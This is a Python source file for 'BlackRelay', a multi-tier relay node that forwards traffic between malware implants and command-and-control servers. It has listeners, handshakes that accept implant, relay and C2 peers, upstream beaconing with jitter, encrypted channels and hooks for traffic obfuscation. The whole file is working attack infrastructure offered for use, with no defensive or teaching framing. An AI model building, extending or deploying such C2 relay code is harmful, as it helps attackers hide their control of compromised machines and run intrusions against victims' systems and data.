"""
BlackRelay Core Module
Provides relay functionality for obfuscated C2 communications
"""
import socket
import threading
import time
import logging
import ssl
import queue
import yaml
import os
import json
from typing import Dict, List, Any, Optional, Union, Tuple, Callable
import base64
import hashlib
import random
import uuid

# Import from other modules
from blackcypher.encryption import HybridEncryption, AsymmetricEncryption
from blackcypher.obfuscation import TrafficObfuscator


class RelayNode:
    """Core relay node that forwards traffic between implants and C2 servers"""
    
    def __init__(self, config_path: str = "blackrelay/relay_config.yaml"):
        """Initialize the relay node
        
        Args:
            config_path: Path to the relay configuration file
        """
        self.logger = self._setup_logging()
        self.config = self._load_config(config_path)
        self.running = False
        
        # Communication channels
        self.channels = {}
        self.active_connections = {}
        self.connection_stats = {}
        self.command_queue = queue.Queue()
        self.response_queue = queue.Queue()
        
        # Node identification
        self.node_id = self._generate_node_id()
        self.node_role = self.config.get("role", "edge")
        
        # Peer tracking
        self.upstream_peers = {}
        self.downstream_peers = {}
        
        # Encryption setup
        self.crypto = self._setup_encryption()
        
        # Traffic transformation
        self.traffic_transformer = TrafficObfuscator()
        
        self.logger.info(f"BlackRelay node {self.node_id} initialized with role {self.node_role}")
    
    def _setup_logging(self) -> logging.Logger:
        """Set up logging for the relay node
        
        Returns:
            Configured logger
        """
        logger = logging.getLogger("BlackRelay")
        logger.setLevel(logging.INFO)
        
        # Create handlers
        c_handler = logging.StreamHandler()
        f_handler = logging.FileHandler("blackrelay.log")
        c_handler.setLevel(logging.INFO)
        f_handler.setLevel(logging.DEBUG)
        
        # Create formatters
        formatter = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s')
        c_handler.setFormatter(formatter)
        f_handler.setFormatter(formatter)
        
        # Add handlers to logger
        logger.addHandler(c_handler)
        logger.addHandler(f_handler)
        
        return logger
    
    def _load_config(self, config_path: str) -> Dict[str, Any]:
        """Load configuration from YAML file
        
        Args:
            config_path: Path to the configuration file
            
        Returns:
            Dictionary with configuration settings
        """
        try:
            import yaml
            with open(config_path, 'r') as f:
                config = yaml.safe_load(f)
            
            self.logger.debug(f"Configuration loaded from {config_path}")
            return config
        except Exception as e:
            self.logger.warning(f"Failed to load configuration from {config_path}: {e}")
            
            # Return default configuration
            return {
                "role": "edge",
                "listen_address": "0.0.0.0",
                "listen_port": 8443,
                "upstream_address": "127.0.0.1",
                "upstream_port": 9443,
                "use_ssl": True,
                "channels": ["http", "https"],
                "max_connections": 100,
                "connection_timeout": 300,
                "max_retries": 3,
                "jitter": 30,
                "beacon_interval": 60
            }
    
    def _generate_node_id(self) -> str:
        """Generate a unique identifier for this relay node
        
        Returns:
            Unique node ID
        """
        # Check if we have a persisted ID
        id_file = "blackrelay_id"
        if os.path.exists(id_file):
            try:
                with open(id_file, 'r') as f:
                    node_id = f.read().strip()
                    if node_id:
                        return node_id
            except Exception:
                pass
        
        # Generate a new ID
        node_id = str(uuid.uuid4())
        
        # Persist ID
        try:
            with open(id_file, 'w') as f:
                f.write(node_id)
        except Exception as e:
            self.logger.warning(f"Could not persist node ID: {e}")
        
        return node_id
    
    def _setup_encryption(self) -> Dict[str, Any]:
        """Set up encryption keys
        
        Returns:
            Dictionary with encryption configuration and keys
        """
        key_dir = "keys"
        os.makedirs(key_dir, exist_ok=True)
        
        private_key_path = os.path.join(key_dir, "relay_private.pem")
        public_key_path = os.path.join(key_dir, "relay_public.pem")
        
        # Check if keys already exist
        if os.path.exists(private_key_path) and os.path.exists(public_key_path):
            self.logger.info("Loading existing encryption keys")
            
            with open(private_key_path, 'rb') as f:
                private_key_data = f.read()
                
            with open(public_key_path, 'rb') as f:
                public_key_data = f.read()
                
            private_key = AsymmetricEncryption.deserialize_private_key(private_key_data)
            public_key = AsymmetricEncryption.deserialize_public_key(public_key_data)
        else:
            self.logger.info("Generating new encryption keys")
            
            # Generate new keys
            key_size = self.config.get("encryption", {}).get("key_size", 3072)
            private_key, public_key = AsymmetricEncryption.generate_key_pair(key_size)
            
            # Save keys
            private_key_data = AsymmetricEncryption.serialize_private_key(private_key)
            public_key_data = AsymmetricEncryption.serialize_public_key(public_key)
            
            with open(private_key_path, 'wb') as f:
                f.write(private_key_data)
                
            with open(public_key_path, 'wb') as f:
                f.write(public_key_data)
        
        # Load known C2 public keys
        c2_pubkeys = {}
        c2_keys_dir = os.path.join(key_dir, "c2_keys")
        os.makedirs(c2_keys_dir, exist_ok=True)
        
        for key_file in os.listdir(c2_keys_dir):
            if key_file.endswith(".pem"):
                key_id = key_file.replace(".pem", "")
                try:
                    with open(os.path.join(c2_keys_dir, key_file), 'rb') as f:
                        key_data = f.read()
                        c2_pubkey = AsymmetricEncryption.deserialize_public_key(key_data)
                        c2_pubkeys[key_id] = {
                            "key": c2_pubkey,
                            "data": key_data
                        }
                except Exception as e:
                    self.logger.warning(f"Failed to load C2 public key {key_file}: {e}")
        
        self.logger.info(f"Loaded {len(c2_pubkeys)} C2 public keys")
        
        return {
            "private_key": private_key,
            "public_key": public_key,
            "private_key_data": private_key_data,
            "public_key_data": public_key_data,
            "c2_pubkeys": c2_pubkeys
        }
    
    def start(self):
        """Start the relay node"""
        if self.running:
            return
            
        self.running = True
        
        # Start listeners based on role
        if self.node_role in ("edge", "internal"):
            # Edge and internal nodes need to listen for incoming connections
            for channel_type in self.config["channels"]:
                self._start_listener(channel_type)
        
        # Start connector based on role
        if self.node_role in ("internal", "exit"):
            # Internal and exit nodes need to connect upstream
            self._start_upstream_connector()
        
        # Start management threads
        self._start_management_threads()
        
        self.logger.info(f"BlackRelay node {self.node_id} started")
    
    def stop(self):
        """Stop the relay node"""
        if not self.running:
            return
            
        self.running = False
        
        # Close all connections
        for conn_id, conn in list(self.active_connections.items()):
            try:
                conn["socket"].close()
            except:
                pass
        
        self.active_connections.clear()
        
        self.logger.info(f"BlackRelay node {self.node_id} stopped")
    
    def _start_listener(self, channel_type: str):
        """Start a listener for a specific channel type
        
        Args:
            channel_type: Type of channel to start
        """
        if channel_type not in self.channels:
            self.channels[channel_type] = {}
        
        listen_port = self.config.get(f"{channel_type}_port", self.config["listen_port"])
        listen_address = self.config.get("listen_address", "0.0.0.0")
        
        # Create server socket
        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        
        try:
            server_socket.bind((listen_address, listen_port))
            server_socket.listen(5)
            
            self.channels[channel_type]["socket"] = server_socket
            
            # Start listener thread
            listener_thread = threading.Thread(
                target=self._listener_loop,
                args=(server_socket, channel_type)
            )
            listener_thread.daemon = True
            listener_thread.start()
            
            self.channels[channel_type]["thread"] = listener_thread
            
            self.logger.info(f"Started {channel_type} listener on {listen_address}:{listen_port}")
        except Exception as e:
            self.logger.error(f"Failed to start {channel_type} listener: {e}")
    
    def _listener_loop(self, server_socket: socket.socket, channel_type: str):
        """Main loop for listener thread
        
        Args:
            server_socket: Server socket to accept connections on
            channel_type: Type of channel being listened on
        """
        while self.running:
            try:
                client_socket, address = server_socket.accept()
                
                self.logger.debug(f"New {channel_type} connection from {address[0]}:{address[1]}")
                
                # Set socket options
                client_socket.settimeout(self.config.get("connection_timeout", 300))
                
                # Apply SSL if needed
                if self.config.get("use_ssl") and channel_type in ("https", "tls"):
                    try:
                        ssl_context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
                        ssl_context.load_cert_chain(
                            certfile="keys/server.crt",
                            keyfile="keys/server.key"
                        )
                        client_socket = ssl_context.wrap_socket(
                            client_socket,
                            server_side=True
                        )
                    except Exception as e:
                        self.logger.error(f"SSL error: {e}")
                        client_socket.close()
                        continue
                
                # Generate connection ID
                conn_id = str(uuid.uuid4())
                
                # Store connection
                self.active_connections[conn_id] = {
                    "socket": client_socket,
                    "address": address,
                    "channel_type": channel_type,
                    "created": time.time(),
                    "last_activity": time.time(),
                    "bytes_received": 0,
                    "bytes_sent": 0,
                    "direction": "inbound"
                }
                
                # Initialize stats
                if conn_id not in self.connection_stats:
                    self.connection_stats[conn_id] = {
                        "packets_received": 0,
                        "packets_sent": 0,
                        "bytes_received": 0,
                        "bytes_sent": 0,
                        "start_time": time.time()
                    }
                
                # Start handler thread
                handler_thread = threading.Thread(
                    target=self._connection_handler,
                    args=(conn_id,)
                )
                handler_thread.daemon = True
                handler_thread.start()
                
            except Exception as e:
                if self.running:  # Only log if we're still running
                    self.logger.error(f"Error in {channel_type} listener: {e}")
    
    def _start_upstream_connector(self):
        """Start the upstream connector thread"""
        connector_thread = threading.Thread(target=self._upstream_connector_loop)
        connector_thread.daemon = True
        connector_thread.start()
        
        self.logger.info("Started upstream connector")
    
    def _upstream_connector_loop(self):
        """Main loop for upstream connector thread"""
        while self.running:
            try:
                # Check if we need to establish new connections
                self._establish_upstream_connections()
                
                # Sleep with jitter
                jitter_pct = self.config.get("jitter", 30)
                base_interval = self.config.get("beacon_interval", 60)
                jitter = base_interval * jitter_pct / 100
                sleep_time = base_interval + random.uniform(-jitter, jitter)
                
                time.sleep(max(1, sleep_time))
            except Exception as e:
                self.logger.error(f"Error in upstream connector: {e}")
                time.sleep(10)  # Wait a bit before retrying
    
    def _establish_upstream_connections(self):
        """Establish connections to upstream peers if needed"""
        # Count active upstream connections
        active_upstream = sum(1 for conn in self.active_connections.values() 
                            if conn["direction"] == "outbound")
        
        # Get configured upstream servers
        upstream_servers = self.config.get("upstream_servers", [])
        if not upstream_servers and "upstream_address" in self.config:
            # Add default upstream if specific servers aren't configured
            upstream_servers = [{
                "address": self.config["upstream_address"],
                "port": self.config["upstream_port"],
                "channel_type": self.config.get("channels", ["https"])[0]
            }]
        
        # Check if we need more connections
        min_connections = self.config.get("min_upstream_connections", 1)
        if active_upstream >= min_connections:
            return
        
        # Try to establish new connections
        for server in upstream_servers:
            if active_upstream >= min_connections:
                break
                
            address = server["address"]
            port = server["port"]
            channel_type = server.get("channel_type", "https")
            
            try:
                # Create socket
                client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                client_socket.settimeout(self.config.get("connection_timeout", 300))
                
                # Connect
                client_socket.connect((address, port))
                
                # Apply SSL if needed
                if self.config.get("use_ssl") and channel_type in ("https", "tls"):
                    try:
                        ssl_context = ssl.create_default_context()
                        client_socket = ssl_context.wrap_socket(
                            client_socket,
                            server_hostname=address
                        )
                    except Exception as e:
                        self.logger.error(f"SSL error connecting to {address}:{port}: {e}")
                        client_socket.close()
                        continue
                
                # Generate connection ID
                conn_id = str(uuid.uuid4())
                
                # Store connection
                self.active_connections[conn_id] = {
                    "socket": client_socket,
                    "address": (address, port),
                    "channel_type": channel_type,
                    "created": time.time(),
                    "last_activity": time.time(),
                    "bytes_received": 0,
                    "bytes_sent": 0,
                    "direction": "outbound"
                }
                
                # Initialize stats
                if conn_id not in self.connection_stats:
                    self.connection_stats[conn_id] = {
                        "packets_received": 0,
                        "packets_sent": 0,
                        "bytes_received": 0,
                        "bytes_sent": 0,
                        "start_time": time.time()
                    }
                
                # Start handler thread
                handler_thread = threading.Thread(
                    target=self._connection_handler,
                    args=(conn_id,)
                )
                handler_thread.daemon = True
                handler_thread.start()
                
                self.logger.info(f"Established upstream connection to {address}:{port}")
                
                active_upstream += 1
            except Exception as e:
                self.logger.error(f"Failed to connect to {address}:{port}: {e}")
    
    def _start_management_threads(self):
        """Start management threads for monitoring and maintenance"""
        # Start connection monitor thread
        monitor_thread = threading.Thread(target=self._connection_monitor_loop)
        monitor_thread.daemon = True
        monitor_thread.start()
        
        # Start stats reporter thread
        stats_thread = threading.Thread(target=self._stats_reporter_loop)
        stats_thread.daemon = True
        stats_thread.start()
        
        self.logger.debug("Started management threads")
    
    def _connection_monitor_loop(self):
        """Monitor connections and clean up stale ones"""
        while self.running:
            try:
                current_time = time.time()
                
                # Check for stale connections
                for conn_id, conn in list(self.active_connections.items()):
                    idle_time = current_time - conn["last_activity"]
                    timeout = self.config.get("connection_timeout", 300)
                    
                    if idle_time > timeout:
                        self.logger.debug(f"Closing stale connection {conn_id} (idle for {idle_time:.1f}s)")
                        self._close_connection(conn_id)
                
                time.sleep(30)  # Check every 30 seconds
            except Exception as e:
                self.logger.error(f"Error in connection monitor: {e}")
                time.sleep(60)  # Wait a bit before retrying
    
    def _stats_reporter_loop(self):
        """Report relay statistics periodically"""
        while self.running:
            try:
                stats = self._collect_stats()
                self.logger.info(f"Relay stats: {json.dumps(stats)}")
                
                # Sleep for reporting interval
                time.sleep(self.config.get("stats_interval", 300))  # Default: 5 minutes
            except Exception as e:
                self.logger.error(f"Error in stats reporter: {e}")
                time.sleep(60)  # Wait a bit before retrying
    
    def _collect_stats(self) -> Dict[str, Any]:
        """Collect relay statistics
        
        Returns:
            Dictionary with relay statistics
        """
        # Count connections by type
        connection_counts = {
            "total": len(self.active_connections),
            "inbound": sum(1 for conn in self.active_connections.values() if conn["direction"] == "inbound"),
            "outbound": sum(1 for conn in self.active_connections.values() if conn["direction"] == "outbound")
        }
        
        # Count by channel type
        channel_counts = {}
        for conn in self.active_connections.values():
            channel = conn["channel_type"]
            channel_counts[channel] = channel_counts.get(channel, 0) + 1
        
        # Calculate total bytes
        total_bytes_received = sum(conn["bytes_received"] for conn in self.active_connections.values())
        total_bytes_sent = sum(conn["bytes_sent"] for conn in self.active_connections.values())
        
        # Calculate uptime
        uptime = int(time.time() - self.start_time) if hasattr(self, "start_time") else 0
        
        return {
            "node_id": self.node_id,
            "role": self.node_role,
            "uptime": uptime,
            "connections": connection_counts,
            "channels": channel_counts,
            "bytes_received": total_bytes_received,
            "bytes_sent": total_bytes_sent
        }
    
    def _connection_handler(self, conn_id: str):
        """Handle communication on a connection
        
        Args:
            conn_id: Connection identifier
        """
        if conn_id not in self.active_connections:
            return
            
        conn = self.active_connections[conn_id]
        client_socket = conn["socket"]
        
        try:
            # Initial handshake based on connection direction
            if conn["direction"] == "inbound":
                self._handle_inbound_handshake(conn_id, client_socket)
            else:  # outbound
                self._handle_outbound_handshake(conn_id, client_socket)
            
            # Main communication loop
            buffer_size = 4096
            while self.running and conn_id in self.active_connections:
                try:
                    data = client_socket.recv(buffer_size)
                    
                    # Check if connection closed
                    if not data:
                        self.logger.debug(f"Connection {conn_id} closed by peer")
                        break
                    
                    # Update stats
                    conn["last_activity"] = time.time()
                    conn["bytes_received"] += len(data)
                    self.connection_stats[conn_id]["bytes_received"] += len(data)
                    self.connection_stats[conn_id]["packets_received"] += 1
                    
                    # Process and forward data
                    self._process_received_data(conn_id, data)
                    
                except socket.timeout:
                    # Socket timeout is not an error
                    continue
                except Exception as e:
                    self.logger.error(f"Error receiving data on connection {conn_id}: {e}")
                    break
        except Exception as e:
            self.logger.error(f"Error handling connection {conn_id}: {e}")
        finally:
            self._close_connection(conn_id)
    
    def _handle_inbound_handshake(self, conn_id: str, client_socket: socket.socket) -> bool:
        """Handle handshake for inbound connections
        
        Args:
            conn_id: Connection identifier
            client_socket: Client socket
            
        Returns:
            True if handshake successful, False otherwise
        """
        try:
            # Read handshake data
            handshake_data = client_socket.recv(4096)
            
            if not handshake_data:
                self.logger.error(f"Empty handshake from {conn_id}")
                return False
            
            # Parse handshake
            try:
                handshake = json.loads(handshake_data.decode('utf-8'))
            except:
                # Try to decrypt with our private key first
                try:
                    from cryptography.hazmat.primitives.asymmetric import padding
                    from cryptography.hazmat.primitives import hashes
                    
                    decrypted = self.crypto["private_key"].decrypt(
                        handshake_data,
                        padding.OAEP(
                            mgf=padding.MGF1(algorithm=hashes.SHA256()),
                            algorithm=hashes.SHA256(),
                            label=None
                        )
                    )
                    handshake = json.loads(decrypted.decode('utf-8'))
                except Exception as e:
                    self.logger.error(f"Failed to parse handshake from {conn_id}: {e}")
                    return False
            
            # Extract handshake information
            peer_type = handshake.get("type", "unknown")
            peer_id = handshake.get("id", "unknown")
            peer_role = handshake.get("role", "unknown")
            
            # Handle implant connection
            if peer_type == "implant":
                # Implant connections need to be forwarded upstream
                self.downstream_peers[peer_id] = {
                    "id": peer_id,
                    "type": peer_type,
                    "conn_id": conn_id,
                    "first_seen": time.time(),
                    "last_seen": time.time()
                }
                
                # Send acknowledgement
                response = {
                    "type": "handshake_ack",
                    "relay_id": self.node_id,
                    "status": "accepted"
                }
                
                client_socket.sendall(json.dumps(response).encode('utf-8'))
                
                self.logger.info(f"Accepted implant connection from {peer_id}")
                return True
            
            # Handle relay connection
            elif peer_type == "relay":
                # Add to peer list
                if peer_role == "edge" or peer_role == "internal":
                    self.downstream_peers[peer_id] = {
                        "id": peer_id,
                        "type": peer_type,
                        "role": peer_role,
                        "conn_id": conn_id,
                        "first_seen": time.time(),
                        "last_seen": time.time()
                    }
                elif peer_role == "internal" or peer_role == "exit":
                    self.upstream_peers[peer_id] = {
                        "id": peer_id,
                        "type": peer_type,
                        "role": peer_role,
                        "conn_id": conn_id,
                        "first_seen": time.time(),
                        "last_seen": time.time()
                    }
                
                # Send acknowledgement
                response = {
                    "type": "handshake_ack",
                    "relay_id": self.node_id,
                    "role": self.node_role,
                    "status": "accepted"
                }
                
                client_socket.sendall(json.dumps(response).encode('utf-8'))
                
                self.logger.info(f"Accepted relay connection from {peer_id} (role: {peer_role})")
                return True
            
            # Handle C2 connection
            elif peer_type == "c2":
                # C2 connections are only accepted by exit nodes
                if self.node_role != "exit":
                    response = {
                        "type": "handshake_ack",
                        "relay_id": self.node_id,
                        "status": "rejected",
                        "reason": "relay node role does not accept direct C2 connections"
                    }
                    client_socket.sendall(json.dumps(response).encode('utf-8'))
                    self.logger.warning(f"Rejected C2 connection from {peer_id} (incompatible role)")
                    return False
                
                # Add to peer list
                self.upstream_peers[peer_id] = {
                    "id": peer_id,
                    "type": peer_type,
                    "conn_id": conn_id,
                    "first_seen": time.time(),
                    "last_seen": time.time()
                }
                
                # Send acknowledgement
                response = {
                    "type": "handshake_ack",
                    "relay_id": self.node_id,
                    "role": self.node_role,
                    "status": "accepted"
                }
                
                client_socket.sendall(json.dumps(response).encode('utf-8'))
                
                self.logger.info(f"Accepted C2 connection from {peer_id}")
                return True
            
            else:
                # Unknown peer type
                response = {
                    "type": "handshake_ack",
                    "relay_id": self.node_id,
                    "status": "rejected",
                    "reason": "unknown peer type"
                }
                client_socket.sendall(json.dumps(response).encode('utf-8'))
                self.logger.warning(f"Rejected connection from unknown peer type: {peer_type}")
                return False
            
        except Exception as e:
            self.logger.error(f"Error in inbound handshake for {conn_id}: {e}")
            return False
    
    def _handle_outbound_handshake(self, conn_id: str, client_socket: socket.socket) -> bool:
        """Handle handshake for outbound connections
        
        Args:
            conn_id: Connection identifier
            client_socket: Client socket
            
        Returns:
            True if handshake successful, False otherwise
        """
        try:
            # Create handshake message
            handshake = {
                "type": "relay",
                "id": self.node_id,
                "role": self.node_role,
                "version": "1.0",
                "capabilities": ["http", "https", "dns"],
                "timestamp": time.time()
            }
            
            # Send handshake
            client_socket.sendall(json.dumps(handshake).encode('utf-8'))
            
            # Wait for response
            response_data = client_socket.recv(4096)
            
            if not response_data:
                self.logger.error(f"Empty handshake response for {conn_id}")
                return False
            
            # Parse response
            try:
                response = json.loads(response_data.decode('utf-8'))
            except:
                self.logger.error(f"Invalid handshake response format for {conn_id}")
                return False
            
            # Check if accepted
            if response.get("status") == "accepted":
                peer_id = response.get("relay_id", "unknown")
                peer_role = response.get("role", "unknown")
                
                # Add to peer list
                self.upstream_peers[peer_id] = {
                    "id": peer_id,
                    "type": "relay",
                    "role": peer_role,
                    "conn_id": conn_id,
                    "first_seen": time.time(),
                    "last_seen": time.time()
                }
                
                self.logger.info(f"Connected to upstream relay {peer_id} (role: {peer_role})")
                return True
            else:
                reason = response.get("reason", "unknown")
                self.logger.error(f"Handshake rejected by upstream: {reason}")
                return False
            
        except Exception as e:
            self.logger.error(f"Error in outbound handshake for {conn_id}: {e}")
            return False
    
    def _process_received_data(self, conn_id: str, data: bytes):
        """Process data received from a connection
        
        Args:
            conn_id: Connection identifier
            data: Received data
        """
        if conn_id not in self.active_connections:
            return
            
        conn = self.active_connections[conn_id]
        
        # Check if this is from downstream or upstream
        is_downstream = conn_id in [peer["conn_id"] for peer in self.downstream_peers.values()]
        is_upstream = conn_id in [peer["conn_id"] for peer in self.upstream_peers.values()]
        
        try:
            # Determine forwarding direction based on connection source
            if is_downstream:
                # Data from downstream, forward upstream
                self._forward_upstream(conn_id, data)
                
            elif is_upstream:
                # Data from upstream, forward downstream
                self._forward_downstream(conn_id, data)
                
            else:
                # Unknown source, try to determine based on payload
                self._process_unknown_source(conn_id, data)
            
        except Exception as e:
            self.logger.error(f"Error processing data from {conn_id}: {e}")
    
    def _forward_upstream(self, source_id: str, data: bytes):
        """Forward data to upstream peer(s)
        
        Args:
            source_id: Source connection identifier
            data: Data to forward
        """
        # Find an appropriate upstream connection
        if not self.upstream_peers:
            self.logger.warning(f"No upstream peers available to forward data from {source_id}")
            return
            
        # For now, just use the first upstream peer
        upstream_id = next(iter(self.upstream_peers.values()))["conn_id"]
        
        # Transform data if needed (obfuscation, encryption)
        transformed_data = self._transform_data_for_upstream(data)
        
        # Forward data
        self._send_data(upstream_id, transformed_data)
    
    def _forward_downstream(self, source_id: str, data: bytes):
        """Forward data to downstream peer(s)
        
        Args:
            source_id: Source connection identifier
            data: Data to forward
        """
        # First, try to parse routing information from the data
        target_id = self._extract_target_from_data(data)
        
        if target_id and target_id in self.downstream_peers:
            # We know the specific destination
            dest_id = self.downstream_peers[target_id]["conn_id"]
            
            # Transform data if needed
            transformed_data = self._transform_data_for_downstream(data)
            
            # Forward data
            self._send_data(dest_id, transformed_data)
        else:
            # No specific target, broadcast to all downstream peers
            # (This is generally not ideal but can be necessary in some cases)
            self.logger.debug(f"Broadcasting data to all downstream peers")
            
            transformed_data = self._transform_data_for_downstream(data)
            
            for peer in self.downstream_peers.values():
                dest_id = peer["conn_id"]
                self._send_data(dest_id, transformed_data)
    
    def _process_unknown_source(self, conn_id: str, data: bytes):
        """Try to process data from an unknown source
        
        Args:
            conn_id: Connection identifier
            data: Received data
        """
        # Try to determine if this might be an implant or C2 based on data format
        # This is a simplistic approach and would need to be enhanced in a real implementation
        try:
            # Try to parse as JSON
            json_data = json.loads(data.decode('utf-8'))
            
            if "type" in json_data:
                if json_data["type"] in ["heartbeat", "register", "result"]:
                    # Probably implant data, forward upstream
                    self._forward_upstream(conn_id, data)
                    return
                elif json_data["type"] in ["command", "task", "query"]:
                    # Probably C2 data, forward downstream
                    self._forward_downstream(conn_id, data)
                    return
        except:
            pass
        
        # If we can't determine, try both directions
        try:
            # First try upstream
            self._forward_upstream(conn_id, data)
        except:
            try:
                # Then try downstream
                self._forward_downstream(conn_id, data)
            except:
                self.logger.warning(f"Could not process or forward data from {conn_id}")
    
    def _transform_data_for_upstream(self, data: bytes) -> bytes:
        """Transform data for upstream transmission
        
        Args:
            data: Original data
            
        Returns:
            Transformed data
        """
        # Here we would implement traffic obfuscation, protocol transforms, etc.
        # For now, just return the original data
        return data
    
    def _transform_data_for_downstream(self, data: bytes) -> bytes:
        """Transform data for downstream transmission
        
        Args:
            data: Original data
            
        Returns:
            Transformed data
        """
        # Here we would implement traffic obfuscation, protocol transforms, etc.
        # For now, just return the original data
        return data
    
    def _extract_target_from_data(self, data: bytes) -> Optional[str]:
        """Extract target ID from data
        
        Args:
            data: Data to analyze
            
        Returns:
            Target ID if found, None otherwise
        """
        try:
            # Try to parse as JSON
            json_data = json.loads(data.decode('utf-8'))
            
            # Check for target ID field
            return json_data.get("target_id") or json_data.get("implant_id") or None
            
        except:
            # Not JSON or doesn't have target info
            return None
    
    def _send_data(self, conn_id: str, data: bytes) -> bool:
        """Send data on a connection
        
        Args:
            conn_id: Connection identifier
            data: Data to send
            
        Returns:
            True if successful, False otherwise
        """
        if conn_id not in self.active_connections:
            return False
            
        conn = self.active_connections[conn_id]
        client_socket = conn["socket"]
        
        try:
            client_socket.sendall(data)
            
            # Update stats
            conn["last_activity"] = time.time()
            conn["bytes_sent"] += len(data)
            self.connection_stats[conn_id]["bytes_sent"] += len(data)
            self.connection_stats[conn_id]["packets_sent"] += 1
            
            return True
        except Exception as e:
            self.logger.error(f"Error sending data on connection {conn_id}: {e}")
            self._close_connection(conn_id)
            return False
    
    def _close_connection(self, conn_id: str):
        """Close and clean up a connection
        
        Args:
            conn_id: Connection identifier
        """
        if conn_id not in self.active_connections:
            return
            
        conn = self.active_connections[conn_id]
        
        try:
            conn["socket"].close()
        except:
            pass
        
        # Remove from active connections
        del self.active_connections[conn_id]
        
        # Check if this was a peer connection
        for peer_id, peer in list(self.downstream_peers.items()):
            if peer["conn_id"] == conn_id:
                self.logger.info(f"Downstream peer {peer_id} disconnected")
                del self.downstream_peers[peer_id]
                break
                
        for peer_id, peer in list(self.upstream_peers.items()):
            if peer["conn_id"] == conn_id:
                self.logger.info(f"Upstream peer {peer_id} disconnected")
                del self.upstream_peers[peer_id]
                break


# Run the relay if executed directly
if __name__ == "__main__":
    relay = RelayNode()
    relay.start()
    
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        relay.stop()